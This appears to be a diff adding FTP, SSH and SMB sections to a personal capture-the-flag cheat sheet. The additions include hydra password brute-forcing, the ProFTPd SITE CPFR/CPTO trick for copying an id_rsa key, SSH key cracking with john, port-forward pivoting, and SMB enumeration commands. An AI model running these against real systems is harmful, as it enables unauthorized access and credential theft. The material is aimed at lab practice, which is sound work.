@@ -30,10 +30,12 @@ cmd: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $I
  
 Since most CTFs are web servers, once you have the IP address, try putting the IP address in the web browser. Also try starting a gobuster scan:
 
-Port 80
+PORT 80 - HTTP
+
 #Check web source code
+
 #Run gobuster scan to find hidden web directories
-cmd: gobuster dir -u http://[IP] -w [wordlist path] -x php,sh,txt,cgi,html,js,css,py -t 200 --no-errors
+cmd: gobuster dir -u http://[IP] -w [wordlist path] -x php,sh,txt,cgi,html,js,css,py -t 200 --no-errors | tee gobuster.txt
 
 Common Directories
 robots.txt
@@ -51,8 +53,74 @@ cmd: nikto -h “http://[IP]”
 Get Source Code in terminal
 curl - pulls page source
  
-Port 21: FTP
-Port 22: SSH
-Port 139 or 445: SMB
+PORT 21: FTP
+
+log into ftp 
+cmd: ftp $IP 
+
+if you find username, try brute forcing password 
+cmd: hydra for ftp: hydra -l [user] -P /opt/rockyou.txt ftp://[IP] 
+
+get file from ftp 
+cmd: get file.txt 
+
+add file to ftp 
+cmd: put file.txt 
+
+#Mounting an FTP share, exploiting ProFTPd 
+cmd: nc $IP 21 
+cmd: SITE CPFR /path/to/fiile 
+cmd: SITE CPTO /var/tmp/id_rsa 
+cmd: mount $IP:/var /path/on/attackersPC 
+
+PORT 22: SSH
+
+#log into ssh 
+cmd: ssh [user]@[IP] 
+
+#with id_rsa file  
+cmd: ssh -i id_rsa [username]@[IP] 
+
+#if you find username, try brute forcing it 
+cmd: hydra -t 4 -l username -P /opt/rockyou.txt ssh://$IP 
+
+#ssh into another PC using another subnet 
+cmd: netstat -ano 
+cmd: ssh -L port:$IP:port user@$IP2 
+
+#try to find hidden password in id_rsa file:  
+cmd: python ssh2john.py id_rsa > id_rsa.hash 
+cmd: john id_rsa.hash -wordlist=/opt/rockyou.txt 
+
+PORT 139 or 445: SMB
+
+#NMAP scan to see SMB vuln 
+cmd: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP 
+*Kenobi had SMB vuln that allowed mounting of readable shares  
+
+#Listing SMB folders: 
+cmd: smbclient -L $IP 
+
+#viewing SMB shares 
+cmd: smbclient //$IP/share 
+
+#Recursive SMB folders:  
+cmd: smbget -R smb://<ip>/anonymous 
+
+#Discover shared SMB folders and username: expose usernames 
+cmd: enum4linux -a [IP] 
+
+#MetaSploit option for finding SMB version 
+cmd: msfconsole -q 
+cmd: use scanner/smb/smb_version 
+
+#For anonymous SMB login 
+cmd: smbclient ‘//[IP]/[USERNAME]’ 
+
+#For local SMB user  
+cmd: smbclient -U [username] ‘//[IP]/[username] or smbclient //[IP]/[share] -U [user] -p [port]
+
+#For domain SMB user 
+cmd: smbclient -U [domain]\[username] ‘//[IP]/[username] 
 
 To be continued...
